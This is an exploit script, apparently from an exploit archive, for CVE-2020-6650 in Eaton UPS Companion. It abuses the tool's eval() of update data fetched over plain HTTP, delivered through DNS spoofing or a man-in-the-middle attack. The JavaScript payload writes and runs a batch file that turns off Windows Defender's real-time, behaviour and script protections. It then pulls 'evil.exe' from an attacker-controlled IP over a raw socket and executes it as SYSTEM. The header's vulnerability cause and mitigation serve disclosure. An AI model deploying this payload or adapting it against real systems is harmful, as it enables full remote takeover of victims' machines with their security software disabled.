// Exploit Title: Eaton UPS Companion - Command Injection As SYSTEM Upon A Weekly Update Check
// Date: 2019-12-28
// Vendor Homepage: https://www.eaton.com
// Software Link: https://powerquality.eaton.com/products-services/power-management/software-drivers/ups-companion.asp
// Exploit Author: Ravjot Singh Samra
// Tested Version: Eaton UPS Companion v1.05
// Tested on: Eaton 5E 650i 03.08.0018 UPS (Windows 10 Pro x64 Build 1903)
// CVE: CVE-2020-6650

// Vulnerability cause: `eval()` on an entire URL's data over insecure HTTP. Web interface basically running as root.
// Temporary solution: disable all update checking regardless of automatic install.

// Usage methods:
// Option A. Spoof the DNS, start an HTTP server, and serve this file as "pqsoftware.eaton.com/update/update_euc.info". Wait a week.
// Option B. Listen for a connection to that Eaton URL and intercept/manipulate the insecure HTTP data via a MITM attack. Wait a week.
// Option C. Do either of the above and "inform" the user(s) to check for updates manually. Wait half an hour.

(function() {
    // Change these and serve the executable with `cat <exe> | nc -lvvp <port>`. Catch any shells on another port.
    var address = "192.168.1.???";
    var port = 44444;
    var exe = "evil.exe";

    // Cripple Windows Defender. Disabling it requires NT SERVICE\TrustedInstaller. You can do anything here e.g. post-exploitation.
    var batch = ''; // A batch file avoids any chance of "OpenWith.exe".
    batch += 'powershell -Command "& {Set-MpPreference -Force -ExclusionPath \'C:\\Program Files (x86)\\Eaton\\UPSCompanion\'}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -DisableRealtimeMonitoring 1}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -DisableBlockAtFirstSeen 1}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -DisableBehaviorMonitoring 1}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -DisableScriptScanning 1}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -DisableIOAVProtection 1}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -DisableIntrusionPreventionSystem 1}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -SevereThreatDefaultAction \'NoAction\'}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -HighThreatDefaultAction \'NoAction\'}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -ModerateThreatDefaultAction \'NoAction\'}"\r\n';
    batch += 'powershell -Command "& {Set-MpPreference -Force -LowThreatDefaultAction \'NoAction\'}"\r\n';

    File.put("update.bat", batch);
    System.open("update.bat");

    var socket = new Socket("tcp");
    var file = new File;

    socket.connect(address, port);
    socket.setTimeout(20);
    file.open(exe, "wb");

    do {
        var buffer = socket.recv();
        file.write(buffer);
    } while (buffer.length > 0);

    socket.close();
    file.close();

    System.open(exe);
})()
